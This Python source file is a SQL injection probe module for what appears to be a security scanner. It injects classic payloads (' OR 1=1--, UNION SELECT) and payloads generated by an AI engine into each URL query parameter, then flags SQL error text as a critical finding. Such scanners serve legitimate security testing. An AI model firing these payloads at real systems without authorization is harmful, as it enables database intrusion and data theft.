from backend.core.base import BaseArsenalModule
from backend.core.protocol import JobPacket, Vulnerability, TaskTarget
from backend.ai.cortex import CortexEngine, get_cortex_engine
import urllib.parse

class SQLInjectionProbe(BaseArsenalModule):
    def __init__(self):
        super().__init__()
        self.name = "SQL Injection Probe"
        # CORTEX AI for intelligent payload generation
        try:
            self.ai = get_cortex_engine()
        except Exception:self.ai = None

    async def generate_payloads(self, packet: JobPacket) -> list[TaskTarget]:
        targets = []
        payloads = ["' OR 1=1--", "admin' #", "' UNION SELECT 1,2,3--"]
        
        # CORTEX AI: Generate database-specific payloads
        if self.ai and self.ai.enabled:
            try:
                db_type = packet.config.params.get("db_type", "unknown") if hasattr(packet.config, 'params') else "unknown"
                ai_payloads = await self.ai.generate_sqli_payloads(
                    target_url=packet.target.url,
                    db_type=db_type
                )
                if ai_payloads:
                    payloads.extend(ai_payloads)
            except Exception:pass  # Keep base payloads
                
        if "?" in packet.target.url:
            base_url, query = packet.target.url.split("?", 1)
            params = urllib.parse.parse_qs(query)
            
            for param, values in params.items():
                for payload in payloads:
                    attack_params = params.copy()
                    attack_params[param] = [values[0] + payload]
                    attack_query = urllib.parse.urlencode(attack_params, doseq=True)
                    attack_url = f"{base_url}?{attack_query}"
                    
                    targets.append(TaskTarget(
                        url=attack_url, 
                        method="GET", 
                        headers=packet.target.headers, 
                        payload=packet.target.payload
                    ))
        return targets

    async def analyze_responses(self, interactions: list[tuple[TaskTarget, str]], packet: JobPacket) -> list[Vulnerability]:
        vulnerabilities = []
        for target, text in interactions:
            if isinstance(text, str) and text and ("sql" in text.lower() or "syntax" in text.lower()):
                vulnerabilities.append(Vulnerability(
                    name="SQL Injection",
                    severity="CRITICAL",
                    description=f"Database error triggered in targeted URL.",
                    evidence=f"Target: {target.url}\nResponse contains SQL error.",
                    remediation="Use parameterized queries (Prepared Statements)."
                ))
        return vulnerabilities
